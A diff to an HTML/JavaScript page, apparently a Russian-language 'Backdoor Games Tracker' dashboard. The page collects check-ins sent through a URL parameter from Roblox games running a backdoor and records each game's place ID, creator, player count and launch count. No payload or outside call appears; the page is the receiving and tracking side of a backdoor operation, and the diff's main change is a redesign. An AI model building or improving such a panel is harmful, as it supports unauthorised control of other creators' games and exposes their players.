@@ -3,139 +3,253 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Roblox Games Backdoor List</title>
+    <title>Backdoor Games Tracker</title>
     <style>
-        body { 
-            font-family: Arial, sans-serif; 
-            max-width: 800px; 
-            margin: 0 auto; 
-            padding: 20px; 
-            background-color: #1a1a1a;
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background: linear-gradient(135deg, #1a1a2e, #16213e);
             color: white;
+            min-height: 100vh;
+            padding: 20px;
         }
-        .game-card { 
-            background: #2d2d2d; 
-            padding: 15px; 
-            margin: 10px 0; 
-            border-radius: 8px;
-            border-left: 4px solid #007acc;
+        
+        .container {
+            max-width: 1000px;
+            margin: 0 auto;
         }
-        .stats { 
-            margin-top: 20px; 
-            padding: 15px;
-            background: #2d2d2d;
-            border-radius: 8px;
+        
+        .header {
+            text-align: center;
+            margin-bottom: 30px;
+            padding: 20px;
+            background: rgba(255, 255, 255, 0.1);
+            border-radius: 15px;
+            backdrop-filter: blur(10px);
+        }
+        
+        .stats {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
+            gap: 15px;
+            margin-bottom: 30px;
+        }
+        
+        .stat-card {
+            background: rgba(255, 255, 255, 0.1);
+            padding: 20px;
+            border-radius: 10px;
+            text-align: center;
+            backdrop-filter: blur(5px);
+            border: 1px solid rgba(255, 255, 255, 0.2);
+        }
+        
+        .stat-number {
+            font-size: 2em;
+            font-weight: bold;
+            color: #4cc9f0;
+        }
+        
+        .games-grid {
+            display: grid;
+            gap: 15px;
+        }
+        
+        .game-card {
+            background: rgba(255, 255, 255, 0.1);
+            padding: 20px;
+            border-radius: 10px;
+            border-left: 4px solid #4cc9f0;
+            backdrop-filter: blur(5px);
+            transition: transform 0.3s ease;
+        }
+        
+        .game-card:hover {
+            transform: translateY(-2px);
+            background: rgba(255, 255, 255, 0.15);
+        }
+        
+        .game-name {
+            font-size: 1.3em;
+            font-weight: bold;
+            margin-bottom: 10px;
+            color: #4cc9f0;
+        }
+        
+        .game-info {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(150px, 1fr));
+            gap: 10px;
+            font-size: 0.9em;
+            opacity: 0.8;
+        }
+        
+        .last-update {
+            text-align: center;
+            margin-top: 20px;
+            opacity: 0.7;
+            font-size: 0.9em;
+        }
+        
+        .empty-state {
+            text-align: center;
+            padding: 40px;
+            opacity: 0.7;
         }
     </style>
 </head>
 <body>
-    <h1>Backdoor list</h1>
-    <div id="gamesList"></div>
-    <div class="stats">
-        <h3>Stats:</h3>
-        <p>Games: <span id="totalGames">0</span></p>
-        <p>Last update: <span id="lastUpdate">-</span></p>
+    <div class="container">
+        <div class="header">
+            <h1>🎮 Backdoor Games Tracker</h1>
+            <p>Отслеживание запусков бэкдора</p>
+        </div>
+        
+        <div class="stats">
+            <div class="stat-card">
+                <div class="stat-number" id="totalGames">0</div>
+                <div>Всего игр</div>
+            </div>
+            <div class="stat-card">
+                <div class="stat-number" id="totalLaunches">0</div>
+                <div>Всего запусков</div>
+            </div>
+            <div class="stat-card">
+                <div class="stat-number" id="uniqueGames">0</div>
+                <div>Уникальных игр</div>
+            </div>
+        </div>
+        
+        <div id="gamesList" class="games-grid">
+            <div class="empty-state" id="emptyState">
+                Ожидание данных от Roblox...
+            </div>
+        </div>
+        
+        <div class="last-update">
+            Последнее обновление: <span id="lastUpdate">-</span>
+        </div>
     </div>
 
     <script>
-        // Хранилище данных в LocalStorage
-        let gamesData = JSON.parse(localStorage.getItem('robloxGames') || '[]');
-        
-        // Функция для добавления игры
-        function addGame(gameData) {
-            // Проверяем, есть ли уже такая игра
-            const existingGameIndex = gamesData.findIndex(game => game.placeId === gameData.placeId);
-            
-            if (existingGameIndex !== -1) {
-                // Обновляем существующую запись
-                gamesData[existingGameIndex] = {
-                    ...gamesData[existingGameIndex],
-                    ...gameData,
-                    lastSeen: new Date().toISOString(),
-                    seenCount: (gamesData[existingGameIndex].seenCount || 1) + 1
-                };
-            } else {
-                // Добавляем новую игру
-                gamesData.push({
-                    ...gameData,
-                    firstSeen: new Date().toISOString(),
-                    lastSeen: new Date().toISOString(),
-                    seenCount: 1
-                });
+        class GameTracker {
+            constructor() {
+                this.games = JSON.parse(localStorage.getItem('robloxGames') || '[]');
+                this.init();
             }
             
-            // Сохраняем и обновляем интерфейс
-            saveData();
-            updateUI();
-        }
-        
-        // Функция для обработки входящих данных
-        function handleIncomingData() {
-            // Получаем данные из URL параметров (для GET запросов)
-            const urlParams = new URLSearchParams(window.location.search);
-            const gameData = urlParams.get('data');
+            init() {
+                this.handleUrlData();
+                this.updateUI();
+                setInterval(() => this.updateUI(), 5000);
+            }
             
-            if (gameData) {
-                try {
-                    const parsedData = JSON.parse(decodeURIComponent(gameData));
-                    addGame(parsedData);
-                    
-                    // Очищаем URL после обработки
-                    window.history.replaceState({}, document.title, window.location.pathname);
-                } catch (e) {
-                    console.error('Ошибка парсинга данных:', e);
+            handleUrlData() {
+                const urlParams = new URLSearchParams(window.location.search);
+                const dataParam = urlParams.get('data');
+                
+                if (dataParam) {
+                    try {
+                        const gameData = JSON.parse(decodeURIComponent(dataParam));
+                        this.addGame(gameData);
+                        
+                        // Очищаем URL
+                        window.history.replaceState({}, '', window.location.pathname);
+                    } catch (e) {
+                        console.log('Ошибка данных:', e);
+                    }
                 }
             }
-        }
-        
-        // Функция для сохранения данных
-        function saveData() {
-            localStorage.setItem('robloxGames', JSON.stringify(gamesData));
-        }
-        
-        // Функция для обновления интерфейса
-        function updateUI() {
-            const gamesList = document.getElementById('gamesList');
-            const totalGames = document.getElementById('totalGames');
-            const lastUpdate = document.getElementById('lastUpdate');
             
-            gamesList.innerHTML = '';
-            totalGames.textContent = gamesData.length;
-            lastUpdate.textContent = new Date().toLocaleString();
+            addGame(newGame) {
+                const existingIndex = this.games.findIndex(g => g.placeId === newGame.placeId);
+                const now = new Date().toISOString();
+                
+                if (existingIndex !== -1) {
+                    // Обновляем существующую игру
+                    this.games[existingIndex] = {
+                        ...this.games[existingIndex],
+                        ...newGame,
+                        lastSeen: now,
+                        seenCount: (this.games[existingIndex].seenCount || 1) + 1,
+                        lastPlayers: newGame.players
+                    };
+                } else {
+                    // Добавляем новую игру
+                    this.games.push({
+                        ...newGame,
+                        firstSeen: now,
+                        lastSeen: now,
+                        seenCount: 1,
+                        lastPlayers: newGame.players
+                    });
+                }
+                
+                this.save();
+                this.updateUI();
+            }
             
-            // Сортируем по дате последнего посещения
-            gamesData.sort((a, b) => new Date(b.lastSeen) - new Date(a.lastSeen));
+            save() {
+                localStorage.setItem('robloxGames', JSON.stringify(this.games));
+            }
             
-            gamesData.forEach(game => {
-                const gameCard = document.createElement('div');
-                gameCard.className = 'game-card';
-                gameCard.innerHTML = `
-                    <h3>${game.name || 'Unavaliable'}</h3>
-                    <p><strong>Place ID:</strong> ${game.placeId}</p>
-                    <p><strong>Creator:</strong> ${game.creator || 'Unavaliable'}</p>
-                    <p><strong>Create date:</strong> ${new Date(game.firstSeen).toLocaleString()}</p>
-                    <p><strong>Last:</strong> ${new Date(game.lastSeen).toLocaleString()}</p>
-                    <p><strong>Visits:</strong> ${game.seenCount} times</p>
-                `;
-                gamesList.appendChild(gameCard);
-            });
+            updateUI() {
+                const gamesList = document.getElementById('gamesList');
+                const emptyState = document.getElementById('emptyState');
+                const totalGames = document.getElementById('totalGames');
+                const totalLaunches = document.getElementById('totalLaunches');
+                const uniqueGames = document.getElementById('uniqueGames');
+                const lastUpdate = document.getElementById('lastUpdate');
+                
+                // Статистика
+                const launches = this.games.reduce((sum, game) => sum + (game.seenCount || 1), 0);
+                totalGames.textContent = this.games.length;
+                totalLaunches.textContent = launches;
+                uniqueGames.textContent = this.games.length;
+                lastUpdate.textContent = new Date().toLocaleString();
+                
+                // Список игр
+                if (this.games.length === 0) {
+                    emptyState.style.display = 'block';
+                    gamesList.innerHTML = '';
+                    gamesList.appendChild(emptyState);
+                } else {
+                    emptyState.style.display = 'none';
+                    
+                    const sortedGames = [...this.games].sort((a, b) => 
+                        new Date(b.lastSeen) - new Date(a.lastSeen)
+                    );
+                    
+                    gamesList.innerHTML = sortedGames.map(game => `
+                        <div class="game-card">
+                            <div class="game-name">${this.escapeHtml(game.name)}</div>
+                            <div class="game-info">
+                                <div><strong>Place ID:</strong> ${game.placeId}</div>
+                                <div><strong>Создатель:</strong> ${this.escapeHtml(game.creator)}</div>
+                                <div><strong>Игроков:</strong> ${game.lastPlayers || game.players || 0}</div>
+                                <div><strong>Запусков:</strong> ${game.seenCount || 1}</div>
+                                <div><strong>Первый раз:</strong> ${new Date(game.firstSeen).toLocaleDateString()}</div>
+                                <div><strong>Последний:</strong> ${new Date(game.lastSeen).toLocaleString()}</div>
+                            </div>
+                        </div>
+                    `).join('');
+                }
+            }
+            
+            escapeHtml(text) {
+                const div = document.createElement('div');
+                div.textContent = text;
+                return div.innerHTML;
+            }
         }
         
-        // API endpoint для приема данных (через URL)
-        function getAPIUrl() {
-            return window.location.href;
-        }
-        
-        // Инициализация
-        function init() {
-            handleIncomingData();
-            updateUI();
-            
-            // Показываем URL для API
-            console.log('API URL:', getAPIUrl());
-        }
-        
-        init();
+        // Запускаем трекер
+        new GameTracker();
     </script>
 </body>
 </html>
